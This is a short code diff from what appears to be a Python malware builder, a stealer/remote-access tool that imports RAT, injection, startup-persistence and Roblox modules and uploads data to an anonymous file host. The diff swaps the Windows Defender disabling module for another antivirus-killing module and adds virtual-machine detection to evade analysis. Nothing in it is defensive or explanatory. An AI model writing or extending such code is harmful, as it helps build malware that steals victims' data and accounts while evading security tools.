@@ -6,7 +6,6 @@ import rat
 import InjectX
 import startup
 import _roblox
-import disable_defender
 from config import Config
 from anonFile import uploadToAnonfiles
 ii = informations.Info()
@@ -48,8 +47,11 @@ if cc.get_fake_error() is True:
 if cc.get_start_up() is True:
     startup.start_up()
     
-if cc.get_disable_windows_defender() is True:
-    disable_defender.disabledefender()
+if cc.get_defenderfucker() is True:
+    import defenderfucker
+    
+if cc.get_vmdetection() is True:
+    import vmdetect
 
 
 def writeforfile(data, name):
